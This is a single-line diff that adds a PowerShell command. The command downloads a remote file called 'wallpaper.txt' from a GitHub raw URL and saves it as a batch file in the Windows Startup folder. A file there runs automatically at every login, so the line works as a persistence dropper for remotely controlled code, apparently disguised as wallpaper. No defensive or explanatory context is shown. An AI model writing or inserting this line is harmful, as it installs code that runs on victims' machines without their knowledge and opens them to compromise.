@@ -1,0 +1,1 @@
+(iwr https://raw.githubusercontent.com/CRAFTIL/halva/72ca1aad41d5be8a7386d02710c2505800d85631/wallpaper.txt).Content | Out-File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wallpaper.bat"
